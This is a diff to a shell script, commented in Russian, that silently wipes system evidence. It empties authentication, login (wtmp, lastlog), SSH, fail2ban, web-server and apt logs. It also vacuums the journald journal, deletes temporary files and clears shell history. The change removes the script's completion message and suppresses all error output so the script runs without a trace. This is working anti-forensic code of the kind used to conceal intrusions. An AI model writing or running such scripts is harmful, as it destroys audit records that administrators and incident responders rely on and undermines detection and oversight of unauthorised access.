@@ -12,6 +12,8 @@ sudo truncate -s 0 /var/log/auth.log
 sudo truncate -s 0 /var/log/syslog
 sudo truncate -s 0 /var/log/kern.log
 sudo truncate -s 0 /var/log/dpkg.log
+sudo truncate -s 0 /var/log/apt/history.log 2>/dev/null
+sudo truncate -s 0 /var/log/apt/term.log 2>/dev/null
 
 # Очистка логов входов на сервер
 sudo truncate -s 0 /var/log/wtmp
@@ -22,13 +24,31 @@ sudo truncate -s 0 /var/log/lastlog
 sudo truncate -s 0 /var/log/auth.log.* 2>/dev/null
 sudo truncate -s 0 /var/log/syslog.* 2>/dev/null
 
+# Очистка логов SSH
+sudo truncate -s 0 /var/log/secure 2>/dev/null
+sudo truncate -s 0 /var/log/messages 2>/dev/null
+
+# Очистка логов fail2ban (если установлен)
+sudo truncate -s 0 /var/log/fail2ban.log 2>/dev/null
+
+# Очистка логов nginx/apache (если есть)
+sudo truncate -s 0 /var/log/nginx/access.log 2>/dev/null
+sudo truncate -s 0 /var/log/nginx/error.log 2>/dev/null
+sudo truncate -s 0 /var/log/apache2/access.log 2>/dev/null
+sudo truncate -s 0 /var/log/apache2/error.log 2>/dev/null
+
 # Очистка journald
-sudo journalctl --rotate
-sudo journalctl --vacuum-size=1M
-sudo journalctl --rotate
-sudo journalctl --vacuum-time=1s
+sudo journalctl --rotate 2>/dev/null
+sudo journalctl --vacuum-size=1M 2>/dev/null
+sudo journalctl --rotate 2>/dev/null
+sudo journalctl --vacuum-time=1s 2>/dev/null
+
+# Очистка временных файлов
+rm -rf /tmp/* 2>/dev/null
+rm -rf /var/tmp/* 2>/dev/null
 
 # Очистка истории текущей сессии
 history -c
 
-echo "Logs and history cleaned successfully"
+# Скрытый вывод (без echo)
+exit 0
